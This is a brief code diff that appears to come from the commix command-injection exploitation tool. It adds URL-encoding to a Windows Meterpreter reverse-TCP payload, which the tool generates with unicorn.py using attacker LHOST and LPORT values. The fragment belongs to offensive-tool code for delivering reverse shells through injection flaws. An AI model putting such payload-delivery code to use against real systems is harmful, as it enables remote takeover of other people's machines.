@@ -17,6 +17,7 @@ import os
 import re
 import sys
 import time
+import urllib
 import base64
 import subprocess
 from src.utils import menu
@@ -472,6 +473,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
                 subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
+                other_shell = urllib.quote_plus(other_shell) 
                 print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
                 # Remove the ouput file
                 os.remove(output)
